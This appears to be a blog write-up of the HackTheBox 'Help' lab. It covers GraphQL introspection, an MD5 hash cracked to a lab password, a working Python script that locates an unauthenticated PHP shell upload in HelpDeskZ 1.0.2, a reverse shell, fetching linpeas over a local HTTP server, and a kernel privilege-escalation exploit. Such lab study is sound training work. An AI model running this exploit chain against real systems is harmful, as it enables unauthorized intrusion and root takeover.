---
title: "Help"
date: 2025-12-17
draft: false
description: "HackTheBox Help writeup"
tags: ["hackthebox", "htb", "linux", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Help

## Overview

- **OS:** Linux
- **IP:** 10.129.230.159
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Gained access with php reverseshell, timezone, privesc with linuxexploitsugg.

## Enumeration

Nmap results

{{< figure src="image 209.png" >}}

Port 3000

{{< figure src="image 210.png" >}}

Now that we know we have graphql lets perform enum

{{< figure src="image 211.png" >}}

**Mention content type for json content**

[https://github.com/ivanversluis/pentest-hacktricks/blob/master/pentesting/pentesting-web/graphql.md](https://github.com/ivanversluis/pentest-hacktricks/blob/master/pentesting/pentesting-web/graphql.md)

we find instropection query from this blog

`{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}`

[https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints](https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints)

We find User object with parameters username and password

{{< figure src="image 212.png" >}}

on quering the user object

{{< figure src="image 213.png" >}}

5d3c93182bb20f07b994a7f617e99cff

lets visit [ntlm.pw](http://ntlm.pw) to get the clear text pass
**godhelpmeplz is the password**

[helpme@helpme.com](mailto:helpme@helpme.com)

support site we visited with dirsearch

{{< figure src="image 214.png" >}}

we find the helpdeskz version from the readme directory we got by brute forcing

{{< figure src="image 215.png" >}}

## Vulnerabilities

Helpdeskz version 1.0.2

lets get our reverseshell in php and upload it through the ticket

{{< figure src="image 216.png" >}}

## Exploitation


this is our timezone

{{< figure src="image 217.png" >}}

we update our rpeference in the site to this timezone

{{< figure src="image 218.png" >}}

exploit.py

now we can use this code

```
    import hashlib
    import time
    import sys
    import requests
    
    print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
    
    if len(sys.argv) < 3:
        print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
        sys.exit(1)
    
    helpdeskzBaseUrl = sys.argv[1]
    fileName = sys.argv[2]
    
    currentTime = int(time.time())
    
    for x in range(0, 300):
        plaintext = fileName + str(currentTime - x)
        md5hash = hashlib.md5(plaintext).hexdigest()
    
        url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
        response = requests.head(url)
        if response.status_code == 200:
            print "found!"
            print url
            sys.exit(0)
    
    print "Sorry, I did not find anything"
```

{{< figure src="image 219.png" >}}

First we upload the file on the ticket submission portal and get file not allowed, after that we run the exploit and get a php shell with which we spawn a python rev shell

{{< figure src="image 220.png" >}}

- **Privesc**


we host a simple python server with 

```
    python3 -m http.server 80
```

{{< figure src="image 221.png" >}}

and then we use wget to get linpeas on the system for privesc

we get dirty cow on our system and boom root ( this was supposed to be the case, but the user with dirty cow didnt work so we had to use another linux exploit )

[Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation](https://www.exploit-db.com/exploits/45010)

{{< figure src="image 222.png" >}}

{{< figure src="image 223.png" >}}
